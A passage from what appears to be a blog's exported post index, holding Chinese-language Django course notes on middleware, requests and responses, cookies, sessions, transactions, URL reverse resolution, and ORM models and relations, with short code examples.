page.next_page_number &#125;&#125;&quot;&gt;下一页&lt;/a&gt;&#123;% endif %&#125; 四、中间件1、简介中间件（Middleware）用于在http请求到达视图函数之前 和 视图函数return之后，django会根据自己的规则在合适的时机执行中间件中相应的方法。 常用作view中冗余功能的抽取，如每个页面（或某些页面）在访问前强制登录。 2、定义中间件123456789101112131415161718class MyMiddleware(MiddlewareMixin): # 自定义的中间件 def __init__(self,get_response):#初始化 super().__init__(get_response) print(&quot;init1&quot;) #view处理请求前执行 def process_request(self,request): #某一个view print(&quot;request:&quot;,request) #在process_request之后View之前执行 def process_view(self,request, view_func, view_args, view_kwargs): print(&quot;view:&quot;,request,view_func,view_args,view_kwargs) #view执行之后，响应之前执行 def process_response(self,request,response): print(&quot;response:&quot;,request,response) return response #必须返回response #如果View中抛出了异常 def process_exception(self,request,ex):#View中出现异常时执行 print(&quot;exception:&quot;,request,ex) 中间件中常用的两个过程：process_request , process_response 3、激活中间件每当有请求发生时，所有中间件都会执行自己的生命周期。 12345MIDDLEWARE = [ &#x27;django.middleware.security.SecurityMiddleware&#x27;, .... &#x27;middleware115.middlewares.MyMiddleware&#x27;,# 注册自定义中间件，尽量放在最后注册] 4、强制登录实例12345678910111213141516class MyMiddleAware2(MiddlewareMixin): #如果验证成功，则什么一个不用做，否则返回HttpResponse即可响应请求(中断) def process_request(self,request):#强制登录判断 if &quot;login&quot; not in request.path:#路径中如果没有&quot;login&quot; print(&quot;登录验证&quot;) session = request.session #获取session if session.get(&quot;login&quot;): #判断是否有登录的标记 print(&quot;已登录&quot;) else: print(&quot;未登录&quot;) return render(request,&quot;login.html&quot;) #未登录则，跳转登录页面 else: print(&quot;正在登录&quot;) #如果路径中&quot;login&quot;则是登录动作本身 def process_response(self,request,response): print(&quot;response:&quot;,request,response) return response #持续返回响应","categories":[],"tags":[]},{"title":"","slug":"Django-Day05","date":"2024-10-24T11:20:58.344Z","updated":"2024-10-07T05:20:54.939Z","comments":true,"path":"2024/10/24/Django-Day05/","permalink":"http://example.com/2024/10/24/Django-Day05/","excerpt":"","text":"请求与响应三种形式 -&gt; url -&gt;视图函数-&gt; 接受请求-&gt;处理请求 -&gt;返回响应 一、请求与响应 请求与响应过程 12345678登录请求-&gt;点击登录-&gt;用户名和密码-&gt;view视图函数-&gt;接收请求（传递的数据）request.POST.get()def login_logic(request): print(type(request)) -&gt; HttpRequest return HttpResponse(&#x27;&#x27;) 当用户发起一个请求时，Django 把请求的数据包装成一个 HttpRequest 对象，然后 Django 加载对应的view 函数，把这个 HttpRequest 对象作为第一个参数传给 view 函数。任何 view 函数都应该返回一个 HttpResponse 对象。 客户端发送一个请求，并携带参数到达服务器端 Browser -&gt; Server 服务器会接收请求，并通过request对象获取参数 服务器会进行逻辑处理（查询数据库，验证） 服务器返回响应回到客户端 Server -&gt; Browser 二、HttpRequest请求对象HttpRequest 对象表示来自客户端的一个单独的 HTTP 请求。HttpRequest 对象是 Django 自动创建的，且会传递给视图函数作为第一个参数。 HttpRequest常用的属性： method – 返回一个字符串，表示请求使用的HTTP方法 1234567if request.method == &quot;POST&quot;: ...elif request.method == &quot;GET&quot;: ... GET、POST – 一个类似于字典的对象，包含GET、POST请求时传递的的所有参数 123456789def formRequest(request): if request.method == &#x27;GET&#x27;: a = request.GET.get(&#x27;uname&#x27;) # 通过GET的get方法得到uname对应的值 b = request.GET[&#x27;upwd&#x27;] # 通过字典形式获取 return HttpResponse(&quot;表单传参&quot; + a + b) else: a = request.POST.get(&#x27;uname&#x27;) b = request.POST.get(&#x27;upwd&#x27;) return HttpResponse(&quot;表单传参&quot; + a + b) COOKIES – 包含所有cookies的标准Python字典对象。Keys和values都是字符串。 三、HttpResponse响应对象1、响应对象简介Request 和 Response 对象起到了服务器与客户端之间的信息传递作用。Request 对象用于接收客户端浏览器提交的数据，而 Response 对象的功能则是将服务器端的数据发送到客户端浏览器。 对于 HttpRequest 对象来说，是由 Django 自动创建, 但是，HttpResponse 对象就必须我们自己创建。每个 View 方法必须返回一个 HttpResponse 对象。 2、创建Response对象2.1 不调用模板，直接返回数据1234from django.http import HttpResponsedef index(request): return HttpResponse(&#x27;HelloWorld&#x27;) 2.2 调用模板 使用render()函数 1234from django.http import HttpResponse，renderdef index(request): return render(request, &quot;index.html&quot;) # 建议使用更简易的这种写法 四、view跳转1、跳转的情景一个View接到请求，处理完业务逻辑后，最后都需要给出响应。而响应内容的生成一般不由View负责，Template是专业的响应内容生成者，则此时需要View和Template之间做衔接、跳转。 基本的跳转：从view跳转到template 1234from django.http import HttpResponse，renderdef index(request): return render(request, &quot;index.html&quot;) # 跳转到模板中，并将模板内容显示在客户端 更复杂的跳转：从view跳转到view，再跳转到template（用户注册完成后，自动跳转到登录页面） 123456789def regist_logic(request): try: name = request.POST.get(&quot;userName&quot;) password = request.POST.get(&quot;userPwd&quot;) user = User.objects.create(name=name, password=password) #return HttpResponseRedirect(&quot;/redirect/login/&quot;) # 从一个页面，重定向到另一个页面 return redirect(&quot;/redirect/login/&quot;) # 从一个页面，重定向到另一个页面 except: return HttpResponse(&quot;注册失败&quot;) 跳转方式： 转发：基本的跳转，浏览器中的URL不变 转发发生在一个请求内的跳转，用于View到Template间的跳转， render(request, &quot;test.html&quot;) 即为在一个请求内由View转发跳转到Template 重定向：从view跳转到view，浏览器中的URL发生改变 重定向发生在不同请求之间，用于View之间的跳转 redirect(&quot;另外的View的请求路径：/a/b/c/&quot;) 2、重定向与转发的区别 转发用于View和Template，重定向用于View和View 转发是一次请求内的跳转(地址栏不变)，重定向会自动触发第二次请求(地址栏会改变) 五、Cookie1、Cookie简介Cookie实际上是一种数据存储技术，由服务器端生成，并保存在客户端(浏览器)的一种技术。 HTTP协议是无状态的协议。一旦数据交换完毕，客户端与服务器端的连接就会关闭，再次交换数据需要建立新的连接。 比如你登录邮箱，我们经常会在此时设置30天内记住我，或者自动登录选项。 2、Cookie的使用场合 保存登录信息 保存用户的搜索关键词 3、Cookie的使用过程3.1 存储cookie存储cookie是由Response对象来完成，当通过Response对象设置好cookie后，再响应到客户端，cookie会随之存入到客户端。 由服务器生成，通过Response对象传递给客户端浏览器并保存 不使用模板 1234def index(request): res = HttpResponse(&quot;测试cookie&quot;) res.set_cookie(&quot;uname&quot;,&quot;Mr_lee&quot;) return res; 使用模板 1234def index2(request): res = render(request,&#x27;cookie_demo/index.html&#x27;) res.set_cookie(&quot;age&quot;,18) return res; 设置过期时长：默认是浏览器关闭后失效 – 一个会话周期 max_age&#x3D;0 会删除cookie，如：res.set_cookie(“password”,max_age&#x3D;0) max_age&#x3D;-1，或不设置max_age 都是会话级cookie max_age&#x3D;100 存活100秒，100秒后失效 1res.set_cookie(&quot;age&quot;,18，max_age=100) 3.2 读取cookie请求服务器时，当再次访问项目时，request会携带本项目的所有cookie到达服务器，通过request对象可以读取cookie中的数据。 123456def index(request): #返回所有cookie print(request.COOKIES) #&#123;&#x27;uname&#x27;: &#x27;Mr_lee&#x27;, &#x27;age&#x27;: 18&#125; print(type(request.COOKIES)) #dict request.COOKIES[&#x27;age&#x27;] request.COOKIES.get(&quot;age&quot;) 123Cookie的实现原理： 1. 存储cookie： 客户端浏览器发起一个请求，到达服务器，服务器处理请求，符合某些条件时（登录请求，用户名和密码验证正确，且勾选了‘7天自动登录’），服务器的视图函数通过re.sponse对象来设置cookie值，并返回给客户端浏览器，然后客户端浏览器会将cookie值存储起来 2. 读取cookie: 当客户端浏览器再次发起一个请求时，会通过request对象携带cookie数据到达服务器的视图函数，然后通过request.COOKIES来读取数据 测试实例：记住我 六、Session1、Session简介Cookie是将少量信息存储于客户端（本地浏览器）的，而Session技术是一种将会话状态保存在服务器端的技术。 Session（会话）一般是指浏览器这个页面打开到关闭的这段时间 ，Session用作多个请求之间，共享数据。 常见情景：登录请求成功之后，可以访问其它的页面（我的订单、我的余额等页面）。 2、Session使用2.1 启用Seesion功能 settings.py中如下设置，开启后，请求到达服务器时，就可以使用session了： 12345678910INSTALLED_APPS = [ ... &#x27;django.contrib.sessions&#x27;, ...]MIDDLEWARE = [ ... &#x27;django.contrib.sessions.middleware.SessionMiddleware&#x27;, ...] 在使用session前，需要为django.contrib.sessions做移植生成数据表，用于存储session数据 1python manage.py migrate 2.2 Session生命周期Session默认存活两周，可以修改为一个会话周期，在settings.py中： 1SESSION_EXPIRE_AT_BROWSER_CLOSE=True 2.3 存储Session12345#注意，django默认的session存储位置为数据库的django_session表，需要通过python manage.py migrate生成def xxx(req): req.session[&#x27;username&#x27;]=&quot;Mr_lee&quot; req.session[&#x27;login&#x27;]=1 ... 2.4 读取Session1234def xxx(req): print(req.session[&#x27;username&#x27;]) print(req.session.get(&#x27;login&#x27;)) ... 注意session没有中文问题，没有长度限制，相比存在客户端的cookie更安全 2.5 手动清除Session123req.session.flush() # 清除数据，置空cookie中的sessionid，清除数据表中的记录req.session.clear() #清除数据 但表中的记录还在del req.session[&#x27;username&#x27;] #清除一个key的数据 2.6 Session存储位置 数据库：INSTALLED_APPS 中的 django.contrib.sessions 会在执行移植文件时生成数据表（默认） 缓存：为Project设置缓存组件，则session可以存入缓存，提高执行效率(redis) 文件：存于服务器本地文件中（不建议） cookie：存取客户端的cookie中（不建议，适合小项目） 2.7 Seesion实现原理浏览器第一次请求session对象时，服务器会创建一个session并且生成一个sessionId，存储在数据库中，并将sessionid返回给浏览器，这个sessionId会被保存在浏览器的会话cookie中 在浏览器不关闭的情况下，之后的每次请求请求头都会携带这个sessionId到服务器。服务器接收到请求后就得到该请求的sessionID，服务器找到该id对应的session返还给请求者使用。 2.8 Cookie Session选择 需要在多个请求间多次共享使用的数据，保持状态，使用session，如在多个请求间持续保持一些数据 （session多用于一个会话间的状态保持） 需要在一段时间后依然可以保持的小块数据，使用cookie，如“记住我”，保证一段时间后，可以自动登录 （cookie多用于多个会话间的状态保持） 每个网站在一个浏览器中的cookie数据上限是4kb，session没限制 cookie存在浏览器本地，隐私性不好。安全性较低 测试实例：强制登录 七、全局错误视图设置2xx ​ 成功 3xx ​ 重定向 4xx ​ 资源未找到 5xx ​ 服务器错误 http请求的响应状态码 200&#x3D;成功 404&#x3D;资源未找到 500&#x3D;服务器错误 400&#x3D;bad request… 可以为常见的错误定制错误页面 关闭调试模式，设置allowed_hosts 在templates下新建：404.html 500.html 400.html,在出现对应错误时，会自动跳转错误页面 八、基于View的事务控制&#x3D; Django手动配置事务的方式主要有二种： 第一种是将每个请求都包裹在一个事务中。 需要在settings.py中的database配置中加入&#39;ATOMIC_REQUESTS&#39;: True 1234567891011DATABASES = &#123; &#x27;default&#x27;: &#123; &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;, &#x27;NAME&#x27;: &#x27;jangodb&#x27;, &#x27;USER&#x27;:&#x27;root&#x27;, &#x27;PASSWORD&#x27;:&#x27;123456&#x27;, &#x27;HOST&#x27;:&#x27;localhost&#x27;, &#x27;PORT&#x27;:3306, &#x27;ATOMIC_REQUESTS&#x27;:True &#125;&#125; 当有请求过来时，Django会在调用视图方法前开启一个事务。如果请求正确处理并正确返回了结果，Django就会提交该事务。否则，Django会回滚该事务。 123456# 运行View前已经开启事务def test(request): Person(name=&quot;tx_name22&quot;, age=18).save() Person(name=&quot;tx_name33&quot;, age=18).save() a=10/0 #出现异常，事务自动回滚 return HttpResponse(&quot;abc&quot;) 注意： 如下情况，事务依然提交 基于View的事务控制，不能处理异常，否则事务行为被破坏 如果在view中try了异常，django就认为整个View没有异常，则事务正常提交 12345678910def test(request): try: Person(name=&quot;tx_name22&quot;, age=18).save() Person(name=&quot;tx_name33&quot;, age=18).save() a=10/0 except Exception: print(&quot;error&quot;) raise return render(request,&quot;error1.html&quot;) return render(request,&quot;success.html&quot;) 第二种是自己在view中通过上下文管理器灵活控制事务。 12345678910def testt(request): try: with transaction.atomic():#开始一个事务 环境,with结束时，如果没有异常，事务提交；否则回滚 Person(name=&quot;tx_name22&quot;, age=18).save() Person(name=&quot;tx_name33&quot;, age=18).save() a=10/0 return render(request,&quot;success.html&quot;) except: print(&quot;error&quot;) #此时的异常已经回滚 return render(request,&quot;error.html&quot;) #还可以为错误提供专用的视图页面 九、反向解析1、简介在实际的Django项目中，经常需要获取某条URL，为生成的内容配置URL链接。 比如提交表单时，跳转到某个url，点击a标签链接到某个url，此时在表单和a标签中一定不能硬编码URL 。 1234&lt;!-- 都使用了硬编码 --&gt;&lt;form action=&quot;/account/loginlogic/&quot; method=&quot;post&quot;&gt; &lt;/form&gt;&lt;a href=&quot;/account/regist/&quot;&gt;注册&lt;/a&gt; 12path(&#x27;loginlogic/&#x27;,views.login_logic),path(&#x27;regist/&#x27;, views.regist_view), 一旦URLconf中的的路由配置发生修改，则需要在所有使用到该url的地方去作修改。显然这种做法是比较stupid。 2、反向解析此时我们需要一种安全、可靠、自适应的机制，当修改URLconf中的代码后，无需在项目源码中大范围搜索、替换失效的硬编码URL。 为了解决这个问题，Django提供了一种解决方案，只需在URL中提供一个name参数，并赋值一个你自定义的、好记的、直观的字符串。 通过这个name参数，可以反向解析URL、反向URL匹配、反向URL查询或者简单的URL反查。 123urlpatterns = [ path(&#x27;index/&#x27;,views.index,name=&#x27;index&#x27;),] 3、如何使用在需要解析URL的地方，对于不同层级，Django提供了不同的工具用于URL反查： 在模板语言中：使用url模板标签。(也就是写前端网页时） 1&lt;a href=&quot;&#123;% url &#x27;index&#x27; %&#125;&quot;&gt;反向解析&lt;/a&gt; 在Python代码中： 12345def index(request): #url = reverse(&#x27;index&#x27;) # 可用作重定向的url等 #print(url) return redirect(&quot;index&quot;) -- path(&#x27;index/&#x27;,views.index,name=&#x27;index&#x27;), 4、URL命名空间URL名称name使用的字符串可以包含任何你喜欢的字符，但是过度的放纵有可能带来重名的冲突，比如两个不同的app，在各自的urlconf中为某一条url取了相同的name，这就会带来麻烦。为了解决这个问题，又引出了下面的命名空间。 URL命名空间可以保证反查到唯一的URL，即使不同的app使用相同的URL名称。 实现命名空间的做法很简单，在当前app下的urls文件中添加app_name = &#39;xxx&#39; 即可。 1234567#-- urls.py -- #app_name=&#x27;reverse_app&#x27; # 定义app_nameurlpatterns = [ path(&#x27;index/&#x27;,views.index,name=&#x27;index&#x27;),] 使用时在name前加app_name:url_name即可： 1234def index(request): url = reverse(&#x27;reverse_app:index&#x27;) # 使用方式 app_name:url_name print(url) return render(request, &#x27;index.html&#x27;) 1&lt;a href=&quot;&#123;% url &#x27;reverse_app:index&#x27; %&#125;&quot;&gt;反向解析&lt;/a&gt; 作业： 技术点熟悉，练习 登录 注册 index 如果没有登陆状态的情况下 强制登陆,有登陆状态可以正常访问 记住我七天:如果用户勾选了这个选项提交表单,储存cookies,下次用户再访问登陆页面时候直接登陆 重新写 反向解析 加一个事务控制 ​","categories":[],"tags":[]},{"title":"","slug":"Django-Day04","date":"2024-10-24T11:20:58.342Z","updated":"2024-10-07T05:20:55.090Z","comments":true,"path":"2024/10/24/Django-Day04/","permalink":"http://example.com/2024/10/24/Django-Day04/","excerpt":"","text":"模型_02一、关联关系1、概述关联关系指的是数据表之间的数据是相互依赖和影响关系，表之间有从属关系，比如，有一个用户表，用户又有订单表，则用户表与订单表之间就存在从属关系。 2、关联关系的种类 一对一 一个人一本护照 一对多 一个部门可以有多个员工 多对多 一个学生有多门课，一门课有多个学生 3、Model中的关联关系3.1 关系类型字段 ForeignKey(to&#x3D;关系对方的类或类名或‘self’，on_delete&#x3D;级联选项) OneToOneField(to&#x3D;关系对方的类或类名或‘self’，on_delete&#x3D;级联选项) ManyToManyField(to&#x3D;关系对方的类或类名或‘self’) 4、关联关系Model搭建4.1 一对多Model123456789101112131:*class Category(models.Model): title = models.CharField(max_length=20) note = models.CharField(max_length=20) class Meta: db_table=&quot;t_category&quot;class Goods(models.Model): title = models.CharField(max_length=20,unique=True) price = models.FloatField() cate = models.ForeignKey(to=Category,on_delete=models.CASCADE) #关系属性 级联删除 class Meta: db_table = &quot;t_goods&quot; 4.2 一对一Model1234567891011121:1class Passport(models.Model): note = models.CharField(max_length=20) person = models.OneToOneField(to=&quot;Person&quot;,on_delete=models.CASCADE,null=True) #关系属性 class Meta: db_table=&quot;t_passport&quot;class Person(models.Model): name = models.CharField(max_length=20) age = models.IntegerField() class Meta: db_table=&quot;t_person&quot; 4.3 多对多Model12345678910111213*:*class Student(models.Model): name = models.CharField(max_length=20) age = models.IntegerField() class Meta: db_table=&quot;t_student&quot; class Course(models.Model): title = models.CharField(max_length=30) expire = models.SmallIntegerField() stu = models.ManyToManyField(to=Student) #关系属性 class Meta: db_table=&quot;t_course&quot; 5、关联关系查询5.1 一对一查询12345678910111213141516171819202122232425pn = Person.objects.all() # 所有的人pt = Passport.objects.all() # 所有的护照pn[0].passport # 通过对方类名小写，获得对方pt[0].per # 在护照类中，有Person属性per，所以通过per即可获取Person对象pn[0].passport.country # 继续获取属性值pt[0].per.name # 1对1关系： 关联查询，会进行表连接#注意：在查询条件中，如在filter中:# passport__country是passport的country字段# passport__id是passport的id字段# per__name是Person的name字段，#护照的country中包含&quot;中&quot;的Person，会做表连接Person.objects.filter(passport__country__contains=&quot;中&quot;)Person.objects.filter(passport__country=&quot;中国&quot;) ##护照的country是&quot;中国&quot;的PersonPerson.objects.filter(passport__id=1)#护照的id是1的PersonPassport.objects.filter(per__id=1)#id为1的person的PassportPassport.objects.filter(per__id__gt=1)#id大于1的person的PassportPassport.objects.filter(per__name__contains=&quot;z&quot;)#id大于1的person的Passport# 保留双方数据Person.objects.filter(passport__country=&#x27;USA&#x27;).values(&#x27;id&#x27;,&#x27;name&#x27;,&#x27;age&#x27;,&#x27;passport__country&#x27;) 5.2 一对多查询1234567891011121314151617181920212223242526272829# 1对多关系 Category(1)：没有关系属性 Goods(*)：其中有关系属性cate#单独查一方cs = Category.objects.all()gs = Goods.objects.all()cs[0].goods_set # 没有多方的关系属性，通过&quot;多方类名_set&quot;获得多方 # 此时只是返回一个RelatedManger，不支持遍历和限制获取子集 而且并没有数据，需要如下cs[0].goods_set.filter(price__gt=200) #第一个类别中价格大于200的所有商品 (如此才有值)cs[0].goods_set.all() # 第一个类别中价格大于200的所有商品（如此才有值）gs[0].cate #获得第一个商品的类别对象gs[0].cate.title #获得对象后 自然可以继续获取属性#关联查询Goods.objects.filter(cate__gte=1) # 类别id大于1的商品Goods.objects.filter(cate__title__contains=&quot;xx&quot;)Goods.objects.filter(cate__pk__gte=1) # 类别id大于1的商品Goods.objects.filter(cate__id__gte=1)Goods.objects.filter(cate__title__contains=&quot;s&quot;)# 列名标题含有&quot;s&quot;的商品Category.objects.filter(goods__gt=1)#id大于1的商品的类别Category.objects.filter(goods__pk__gt=1)#id大于1的商品的类别Category.objects.filter(goods__title__contains=&quot;a&quot;)#标题中含有&quot;a&quot;的商品的类别#关联查询：保留双方数据Goods.objects.filter(cate__title__contains=&quot;s&quot;).values(&quot;cate__title&quot;,&quot;pk&quot;,&quot;price&quot;)#注意在进行联合查询时，可能会由重复数据出现，解决：list(set(Category.objects.filter(goods__price__gt=200))) 5.3 多对多查询12345678910111213141516# 多对多关系 Course：有对方关系属性students Student：没有对方关系属性 # 查询一方stus = Student.objects.all()cours = Course.objects.all()stus[0].course_set #返回ManyRelatedManager，但并没有数据stus[0].course_set.all() #获得对方数据stus[0].course_set.filter(title__contains=&#x27;s&#x27;) #获得第一个学生的 标题中含有&quot;s&quot;的课程cours[0].stu.all()cours[0].stu.filter(age__gt=18)#关联查询Student.objects.filter(course__title__contains=&quot;h&quot;) #标题中含有&quot;h&quot;的课程中的学生Course.objects.filter(stu__name=&quot;zzz&quot;) #姓名为zzz的学生参加的课程Course.objects.filter(stu__age__gt=18) #年龄大于18的学生参加的课程 6、增加数据 单独增加主表方(没有外键一方) 和单表增加无差异 12c = Category.objects.create(title=&quot;男装&quot;,...)c.save() 为已存在的主表方附加从表数据（常见的增加情形） 123456789# 方式一： 先取某一个类别，再通过该类别创建一个商品c = Category.objects.filter(pk=1) # 获取类别一对象c.goods_set.create(title = &#x27;abc&#x27;,price=139.99) # 不需要再save# 方式二：先取某个类别，单独创建商品并关联类别c = Category.objects.get(pk=1)g = Goods.objects.create(title=&#x27;abc&#x27;,price=213,cate=c) #为商品的关系属性赋值# 注意：如果是1：1，则只能使用方式二 同时添加主从数据 12345678910111213c = Category(title=&quot;类别1&quot;,note=&quot;xx&quot;)g = Goods(title=&quot;zzz6&quot;,price=100)g.save() #此时，外键的值为nullc.save()c.goods_set.add(g) #会同步数据库,补充外键值或c = Category(title=&quot;类别1&quot;,note=&quot;xx&quot;)c.save()g = Goods(title=&quot;zzz6&quot;,price=100，cate9=c)g.save() #此时，good是有外键值的#注意如果是1:1只能用第二种 7、删除数据 单独删除从表方，和删除单表无差异 1Goods.objects.get(pk=1).delete() 删除主表方，此时要看从表方的级联设置，会影响到从表方 级联选项 : 在关联关系中删除主表时，对于从表可以有级联操作 CASCADE 级联删除 SET_NULL 外键置空(如果允许空的话) PROTECT 不允许直接删除主表 SET_DEFAULT 需要为外键列设置默认值，默认值也应该是合法的外键值，可以在表中预留一个id SET() 将外键设置为某个值，值应该是合法的外键值，可以在表中预留一个id DO_NOTHING django什么也不做，由数据库决定是否合法 *:* 不支持级联删除 123456789101112#如果要删除主，所有从的外键置null （重要）per = models.OneToOneField(to=Person,on_delete=models.SET_NULL,null=True)#如果要删除主，所有从一起删除per = models.OneToOneField(to=Person,on_delete=models.CASCADE,null=True)#如果要删除主，django什么也不做，有数据库决定是否合法per = models.OneToOneField(to=Person,on_delete=models.DO_NOTHING,null=True)#如果要删除主，所有从的外键置为6 （重要）cate = models.ForeignKey(to=&quot;Category&quot;,on_delete=models.SET(6))#如果要删除主，所有从的外键置为默认值5 （重要）cate = models.ForeignKey(to=&quot;Category&quot;,on_delete=models.SET_DEFALUT,default=&quot;5&quot;)#如果要删除主，如果有从数据存在，不允许删除cate = models.ForeignKey(to=&quot;Category&quot;,on_delete=models.PROTECT) 8、修改数据查询出数据，修改属性，然后save()即可 123456789101112cs = Category.objects.all()c = cs[0]c.title=&quot;new_title&quot;c.save()# 坑：Category.objects.all()[0].title=&quot;new_title&quot; #查询一次，并修改Category.objects.all()[0].save() #查询一次，并保存# 正确的cate1=Category.objects.all()[0]cate1.title=&quot;new_title&quot;cate1.save() 二、懒加载Lazy-loadQuerySet在查询数据时，是延迟执行，直到真正使用了数据，才发起查询 123456789a = Person.objects.all() #未查询b = Category.objects.all() #未查询print(a) #查询了a#如上代码只执行了一次查询c = Category.objects.all() #未查询print(c) #查询cgoods = c[0].goods_set.all() #未查询goodsprint(goods) #查询了goods 测试方式 找到mysql的安装目录下的my.ini文件，添加配置： 123456789# SERVER SECTION[mysqld].....log = &quot;E:/mysql_log.log&quot; #设置日志文件，记录sql语句执行或general-log=1general_log_file=E:/mysql_log.log#需要重启Mysql服务 net stop/start mysql","categories":[],"tags":[]},{"title":"","slug":"Django-Day03","date":"2024-10-24T11:20:58.340Z","updated":"2024-10-07T05:20:55.593Z","comments":true,"path":"2024/10/24/Django-Day03/","permalink":"http://example.com/2024/10/24/Django-Day03/","excerpt":"","text":"模型_01一、模型简介1、模型概述 模型（Models）：用来构建和操作你的web应用中的数据，模型是你的数据的唯一的、权威的信息源。它包含你所储存数据的必要字段和行为。通常，每个模型对应数据库中唯一的一张表。 **模板(Templates)**：模板层提供了设计友好的语法来展示信息给用户。使用模板方法可以动态地生成HTML。模板包含所需HTML 输出的静态部分，以及一些特殊的语法，描述如何将动态内容插入。 视图（views）：用于封装负责处理用户请求及返回响应的逻辑。视图可以看作是前端与数据库的中间人，它会将前端想要的数据从数据库中读出来给前端。也会将用户要想保存的数据写到数据库。 2、ORM2.1 ORM概念ORM是对象关系映射(Object Relational Mapping)的缩写，由于程序设计者更多采用面向对象的思想，而数据库则以关系作为其基础，ORM的作用使得我们可以采用面向对象的思路来设计数据库，使数据库设计更加简单。 1234567写类和对象 -&gt; 操作数据库不再写原生的SQL语句在之前的课程中，都是使用原生的SQL来操作数据： 1. 连接数据库 conn = MySQLdb.connect(host,port) 2. 声明游标对象 cursor = conn.cursor() 3. 执行SQL语句 cursor.execute(sql语句) fetch 或 commit 4. 关闭游标和连接 2.2 ORM的优势Django的ORM操作本质上会根据对接的数据库引擎，翻译成对应的sql语句；所有使用Django开发的项目无需关心程序底层使用的是MySQL、Oracle、sqlite….，如果数据库迁移，只需要更换Django的数据库引擎配置即可。 二、Model层开发过程1、安装数据库驱动1pip install mysqlclient 2、数据库配置在项目的 settings.py 文件中找到 DATABASES 配置项，将其信息修改为： 12345678910DATABASES = &#123; &#x27;default&#x27;: &#123; &#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;, # 数据库引擎 &#x27;NAME&#x27;: &#x27;test&#x27;, # 数据库名 &#x27;USER&#x27;: &#x27;root&#x27;, # 用户名 &#x27;PASSWORD&#x27;: &#x27;123456&#x27;, # 密码 &#x27;HOST&#x27;:&#x27;localhost&#x27;, # 主机ip &#x27;PORT&#x27;:3306, # 端口号 &#125;&#125; 3、创建App，安装App（挂载APP） Django规定，如果要使用模型，必须要创建一个app： 1python manage.py startapp testapp 安装App 在settings.py文件中 123456789INSTALLED_APPS = [ &#x27;django.contrib.admin&#x27;, &#x27;django.contrib.auth&#x27;, &#x27;django.contrib.contenttypes&#x27;, &#x27;django.contrib.sessions&#x27;, &#x27;django.contrib.messages&#x27;, &#x27;django.contrib.staticfiles&#x27;, &#x27;testapp&#x27;, # 创建的app名] 4、定义Model类在App目录下的Models.py文件中，添加Model类： 1234567from django.db import modelsclass User(models.Model): # 一个Model类将对应数据库中的一个表 -- 基类 name = models.CharField(max_length=30) age = models.IntegerField() salary = models.DecimalField(max_digits=7,decimal_places=2) birthday = models.DateTimeField() 5、生成移植文件记录1python manage.py makemigrations # 生成迁移记录 补充：python manage.py sqlmigrate modelapp 0001 查看对应的sql语句 6、执行移植操作1python manage.py migrate # 执行迁移操作--应用到数据库 7、测试Model1234567-- views.py -- def testdb(request): userlist = User.objects.all() str = &#x27;&#x27; for user in userlist: str += (user.name+&#x27;,&#x27;) return HttpResponse(&#x27;查询结果：&#x27;+str) 三、模型字段1、常用字段类型 字段类型 说明 AutoField 一般不用直接使用，Model中默认的主键类型。Django默认给每个Model一个主键字段(如果没有自己定义的话) SmallIntegerField 2字节 smallint IntegerField 4字节 int BigIntegerField 8字节 bigint FloatField double DecimalField DecimalField(max_digits&#x3D;5,decimal_places&#x3D;2) decimal。 必填：max_digits&#x3D;5 #共有几位数必填：decimal_places&#x3D;2#其中小数位占几位 CharField CharField(max_length&#x3D;20) max_length是必填属性 &#x3D;&#x3D; varchar(20) TextField longtext BooleanField 接收“True&#x2F;False” tinyint NullBooleanField 接收“True&#x2F;False&#x2F;None” tinyint DateTimeField datetime DateField 可选：auto_now&#x3D;true 可做修改时间记录可选：auto_now_add&#x3D;True 可做首次添加时间注意：以上两属性之一指定后，该字段不允许被编辑 TimeField time ForeignKey ForeignKey(to&#x3D;关系对方的类或类名或‘self’，on_delete&#x3D;级联选项) OneToOneFiled OneToOneFiled(to&#x3D;关系对方的类或类名或‘self’，on_delete&#x3D;级联选项) ManyToManyFiled ManyToManyFiled(to&#x3D;关系对方的类或类名或‘self’) 2、字段参数 null 默认False,不能为空 1name = models.CharField(max_length=20,null=True) #可为空 default 定义默认值 123name = models.CharField(max_length=20,default=&quot;Mr_lee9&quot;)age = models.IntegerField(default=18)birthday = models.DateTimeField(default=&quot;2018-12-12&quot;) 默认值不会作用在数据库上，而是django自己的约定，通过Model.save()时，会使用默认值 primary_key 12id = models.AutoFiled(primary_key=True) #默认追加，不用自己定义id = models.CharField(primary_key=True,max_length=32)#如果需要字符串类型的ID可以自己定义 unique 列是否唯一 1name = models.CharField(max_length=20,unique=True) db_column 自定义列名，默认和field同名 1name = models.CharField(max_length=20,db_column=&quot;name9&quot;) db_index 是否在列上建立索引 1name = models.CharField(max_length=20,db_index=True) blank 默认Flase，用于前端页面的form验证（了解） 1note = models.CharField(max_length=20,blank=True) 3、元数据Meta模型的元数据，指的是“除了字段外的所有内容”，例如排序方式、数据库表名、人类可读的单数或者复数名等等。 db_table &#x3D; ‘xxx’ 设置表名（修改django默认生成的表名） unique_together &#x3D; ((‘列名1’,’列名2’),(…)) 设置联合唯一约束 ordering &#x3D; [‘列名1’] 或 [‘列名1’,’列名2’] 123456789class MyModel(models.Model): salary = models.DecimalField(...) ..... age = models.xxx name = models.xxx class Meta: unique_together = ((&quot;salary&quot;, &quot;salary2&quot;),(&quot;age&quot;,&quot;age2&quot;,&quot;age3&quot;)) db_table=&quot;my_user&quot; ordering=[&#x27;-age&#x27;,&#x27;name&#x27;] #根据age降序排列，如果age相同，再按照name升序排列 四、Model-API增删改1、创建对象（添加数据）在Terminal中执行python manage.py shell进入python解释器或直接点“Python Console”进入python环境： 123456789from testapp.models import Useruser = User(name=&#x27;Mr_lee&#x27;,age=18,salary=20000,birthdayday=&#x27;1985-7-12 10:10:08&#x27;) #创建对象user.save() # 向数据库插入一条数据# 或者# 创建对象并保存数据，一步完成user= User.objects.create(name=&#x27;Mr_lee&#x27;,age=18,salary=20000,birthdayday=&#x27;1985-7-12 10:10:08&#x27;) 2、删除数据123456user = User.objects.get(pk=3) / (id=3)user.delete() # User.objects.get(pk=3).delete()# 只删除id=3的数据 函数链 等价 user = User.objects.get(pk=3) user.delete() User.objects.all().delete() # 删除所有数据 3、修改数据123user = User.objects.get(age=18)user.name=&quot;new_name&quot;user.save() # 注意：修改后要save() 五、查询操作1、QuerySet每个Model类都有一个默认的manager实例，名为objects。对数据库中对象的检索， 是通过 model Manager 来构造一个 QuerySet 对象来实现。 QuerySet 对象是一个model 类对应的实例集合，是一个可遍历的结构 。 manger 